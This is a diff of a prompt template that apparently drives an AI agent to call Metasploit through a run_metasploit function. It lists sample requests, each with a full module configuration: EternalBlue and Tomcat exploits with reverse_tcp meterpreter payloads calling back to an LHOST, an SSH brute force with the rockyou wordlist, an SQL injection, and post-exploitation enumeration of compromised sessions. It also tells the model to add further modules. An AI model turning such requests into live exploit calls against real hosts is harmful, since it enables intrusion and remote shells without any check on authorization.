@@ -137,36 +137,36 @@ Ensure that the module_options include all relevant configuration options and th
 Call the run_metasploit function using the constructed module_name, module_options, target, and agent_location parameters.
 
 
-Examples of the User Request and the json used to call the run_metasploit function :
-User Request: Run the EternalBlue exploit on 192.168.1.10 with the localhost agent
-Function Call Json:
+Examples of the User Request and the json used to call run_metasploit :
+User Request: 'Run the EternalBlue exploit on 192.168.1.10 with the localhost agent.'
+Function Call:
 {"module_name": "exploit/windows/smb/ms17_010_eternalblue","module_options": {"RHOSTS": "192.168.1.10","PAYLOAD": "windows/meterpreter/reverse_tcp","LHOST": "192.168.1.100","LPORT": 4444},"target": "192.168.1.10","agent_location": "localhost"}
-User Request: Perform a comprehensive port scan on test.com using the remote agent
-Function Call Json:
+User Request: 'Perform a comprehensive port scan on test.com using the remote agent.'
+Function Call:
 {"module_name": "auxiliary/scanner/portscan/tcp","module_options": {"RHOSTS": "test.com","PORTS": "1-65535","THREADS": 100},"target": "test.com","agent_location": "remote-agent"}
-User Request: Gather Windows user information from a compromised system with session ID 1
-Function Call Json:
+User Request: 'Gather Windows user information from a compromised system with session ID 1.'
+Function Call:
 {"module_name": "post/windows/gather/enum_logged_on_users","module_options": {"SESSION": 1},"target": "session_1_target","agent_location": "meterpreter_session"}
-User Request: Scan for SMB vulnerabilities on the 192.168.1.0/24 network
-Function Call Json:
+User Request: 'Scan for SMB vulnerabilities on the 192.168.1.0/24 network.'
+Function Call:
 {"module_name": "auxiliary/scanner/smb/smb_ms17_010","module_options": {"RHOSTS": "192.168.1.0/24","THREADS": 50},"target": "192.168.1.0/24","agent_location": "localhost"}
-User Request: Exploit a Tomcat server with default credentials at 10.0.0.5:8080
-Function Call Json:
+User Request: 'Exploit a Tomcat server with default credentials at 10.0.0.5:8080.'
+Function Call:
 {"module_name": "exploit/multi/http/tomcat_mgr_upload","module_options": {"RHOSTS": "10.0.0.5","RPORT": 8080,"HttpUsername": "tomcat","HttpPassword": "tomcat","PAYLOAD": "java/meterpreter/reverse_tcp","LHOST": "10.0.0.2","LPORT": 4444},"target": "10.0.0.5","agent_location": "localhost"}
-User Request: Perform a brute force attack on an SSH server at 172.16.0.10 using the rockyou wordlist
-Function Call Json:
+User Request: 'Perform a brute force attack on an SSH server at 172.16.0.10 using the rockyou wordlist.'
+Function Call:
 {"module_name": "auxiliary/scanner/ssh/ssh_login","module_options": {"RHOSTS": "172.16.0.10","USER_FILE": "/usr/share/wordlists/metasploit/unix_users.txt","PASS_FILE": "/usr/share/wordlists/rockyou.txt","STOP_ON_SUCCESS": true,"THREADS": 10},"target": "172.16.0.10","agent_location": "localhost"}
-User Request: Check for the Shellshock vulnerability on web servers in the 192.168.2.0/24 range
-Function Call Json:
+User Request: 'Check for the Shellshock vulnerability on web servers in the 192.168.2.0/24 range.'
+Function Call:
 {"module_name": "auxiliary/scanner/http/apache_mod_cgi_bash_env","module_options": {"RHOSTS": "192.168.2.0/24","THREADS": 20,"TARGETURI": "/cgi-bin/vulnerable.cgi"},"target": "192.168.2.0/24","agent_location": "localhost"}
-User Request: Exploit a known SQL injection vulnerability in a web application at http://target-webapp.com/login.php
-Function Call Json:
+User Request: 'Exploit a known SQL injection vulnerability in a web application at http://target-webapp.com/login.php.'
+Function Call:
 {"module_name": "exploit/multi/http/sqlmap","module_options": {"RHOSTS": "target-webapp.com","RPORT": 80,"PATH": "/login.php","METHOD": "POST","DATA": "username=admin&password=password","TECHNIQUES": "BET","DBMS": "mysql","PAYLOAD": "php/meterpreter/reverse_tcp","LHOST": "192.168.1.100","LPORT": 4444},"target": "target-webapp.com","agent_location": "localhost"}
-User Request: Gather system information from a compromised Windows machine with session ID 2
-Function Call Json:
+User Request: 'Gather system information from a compromised Windows machine with session ID 2.'
+Function Call:
 {"module_name": "post/windows/gather/enum_system","module_options": {"SESSION": 2},"target": "session_2_target","agent_location": "meterpreter_session"}
-User Request: Scan for open ports and services on the IP range 10.10.0.1-10.10.0.50
-Function Call Json:
+User Request: 'Scan for open ports and services on the IP range 10.10.0.1-10.10.0.50.'
+Function Call:
 {"module_name": "auxiliary/scanner/portscan/tcp","module_options": {"RHOSTS": "10.10.0.1-10.10.0.50","PORTS": "1-65535","THREADS": 50},"target": "10.10.0.1-10.10.0.50","agent_location": "localhost"}
 
 Use your knowledge of Metasploit to expand upon these guidelines. If you're aware of more appropriate modules or options for a given scenario, incorporate them into your response. <|LLM_STARTED|> 
